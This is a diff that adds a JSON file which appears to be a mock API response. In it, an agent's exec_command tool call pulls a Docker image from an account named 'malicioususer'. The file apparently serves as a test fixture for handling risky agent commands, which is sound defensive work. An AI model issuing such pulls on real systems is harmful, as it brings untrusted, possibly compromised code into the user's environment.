@@ -1,0 +1,23 @@
+{
+  "created_at": 1781838245,
+  "id": "resp-dd171bd8f2864d94a1cad46eb2819888",
+  "model": "gpt-5.5",
+  "object": "response",
+  "output": [
+    {
+      "arguments": "{\"cmd\": \"docker pull docker.io/malicioususer/ubuntu:latest\", \"yield_time_ms\": 1000, \"max_output_tokens\": 2000}",
+      "call_id": "call_d46eb2819888",
+      "id": "fc_d46eb2819888",
+      "name": "exec_command",
+      "status": "completed",
+      "type": "function_call"
+    }
+  ],
+  "parallel_tool_calls": false,
+  "status": "completed",
+  "usage": {
+    "input_tokens": 0,
+    "output_tokens": 0,
+    "total_tokens": 0
+  }
+}
